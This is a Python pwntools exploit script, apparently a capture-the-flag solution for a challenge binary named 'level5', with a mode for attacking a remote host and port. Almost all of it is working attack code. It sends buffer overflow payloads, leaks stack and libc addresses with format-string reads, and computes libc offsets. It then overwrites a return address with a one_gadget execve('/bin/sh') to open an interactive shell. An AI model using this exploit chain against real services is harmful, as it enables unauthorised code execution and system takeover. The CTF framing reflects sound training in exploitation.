#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

def exploit(r):

    r.recvuntil(": ")
    r.sendline("252534")
    r.recvuntil("name? ")
    r.sendline("A"*124 + "\xc9\x07\xcc")
    r.recvuntil("? ")
    r.sendline("A"*136 +"C")
    r.sendline("73")
    r.sendline("A"*108 + "\x7c\xa4\x04\x08")
    r.recvuntil("Excellent reverse engineering! Level 4 complete.")

    r.recvuntil(": ")
    r.sendline("3")
    r.recv(0xb)
    formatstr = "%71$p"
    r.sendline(formatstr)
    r.recvline()
    gg = r.recvline().strip()
    print("BUF: ",gg)
    r.recvuntil(": ")

    r.sendline("3")
    formatstr = "%77$p"
    r.sendline(formatstr)
    r.recvline()
    libcc = r.recvline().strip()
    print("libccc: ",libcc)
    r.recvuntil(": ")


    system_off = 0x45390
    main_off = 0x020830 
    binsh = 0x18CD57
    base = eval(libcc) - main_off
    r.sendline("1")
    r.recv(0x2d)
    buf = ""
    buf += "a"*cyclic_find("daaaaaaa",n=8)
    buf += p64(eval(gg))
    buf += "C"*8

    '''
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL

    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL'''
    #buf += p64(1)
    #buf += p64(1)
    #buf += p64(1)
    print("Base: ", hex(base))
    print("System: ",hex(base+system_off))
    buf += p64(base+0x45216)
    buf += p64(1)
    buf += p64(base+binsh)
    buf += "A"*(0x42-len(buf))
    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./level5"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

